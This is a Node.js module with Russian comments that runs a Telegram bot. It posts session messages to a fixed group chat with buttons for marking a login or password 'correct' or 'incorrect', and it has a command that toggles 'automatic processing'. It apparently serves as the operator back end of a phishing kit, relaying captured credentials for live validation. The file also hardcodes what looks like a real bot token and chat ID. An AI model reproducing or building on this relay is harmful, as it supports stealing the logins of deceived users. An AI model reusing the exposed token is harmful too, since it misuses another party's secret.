const TelegramBot = require('node-telegram-bot-api');

// Замените 'YOUR_TELEGRAM_BOT_TOKEN' на ваш токен бота
const token = '7247033653:AAF4VCWqIFtCPWA8gi8X7foQMhPoOnHT6Wc';
const bot = new TelegramBot(token, { polling: true });

const chatId = '-1002301067534'; // Замените 'YOUR_CHAT_ID' на ваш идентификатор чата

// Обработчик команд бота
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(chatId, 'Бот запущен. Используйте кнопки для проверки логина и пароля.');
});

// Обработчик кнопок
// bot.on('callback_query', (callbackQuery) => {
//     const message = callbackQuery.message;
//     const data = callbackQuery.data;
  
//     const sessionId = message.text.split('\n').find(line => line.startsWith('Session ID: ')).split(': ')[1]; 
   
//     console.log(sessionId);
//     if (data === 'valid_login') {
//         bot.sendMessage(message.chat.id, 'Вы выбрали: Верный логин');
//     } else if (data === 'invalid_login') {
//         bot.sendMessage(message.chat.id, 'Вы выбрали: Неверный логин');
//     } else if (data === 'valid_password') {
//         bot.sendMessage(message.chat.id, 'Вы выбрали: Верный пароль');
//     } else if (data === 'invalid_password') {
//         bot.sendMessage(message.chat.id, 'Вы выбрали: Неверный пароль');
//     }
// });
bot.onText(/\/auto/, (msg) => {
 
    if(getAuto()){
        
        setAuto(false);
        // Отправить сообщение об успешном изменении состояния переменной auto
        bot.sendMessage(msg.chat.id, 'Автоматическая обработка Выключена - false').then((message_id)=>{
            setTimeout(()=>{
                bot.deleteMessage(msg.chat.id,message_id.message_id)
            },3000);
        })
    }
    else{
        setAuto(true);
        // Отправить сообщение об успешном изменении состояния переменной auto
        bot.sendMessage(msg.chat.id, 'Автоматическая обработка Включена - true').then((message_id)=>{
            setTimeout(()=>{
                bot.deleteMessage(msg.chat.id,message_id.message_id)
            },3000);
        })

    }
});

function sendMessageWithButtons(message) {
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Верный логин', callback_data: 'valid_login' },
                    { text: 'Неверный логин', callback_data: 'invalid_login' }
                ],
                [
                    { text: 'Верный пароль', callback_data: 'valid_password' },
                    { text: 'Неверный пароль', callback_data: 'invalid_password' }
                ]
            ],
            selective:false
        }
        
    };
    if(getAuto()){

        bot.sendMessage(chatId, message, options);
    }
    else{
        message+="\n --Включена авто обработка--"
        bot.sendMessage(chatId, message);
    }
}
let auto = true;

function setAuto(value) {
    auto = value;
}

function getAuto() {
    return auto;
}

 
 
module.exports = { sendMessageWithButtons, bot,setAuto, getAuto };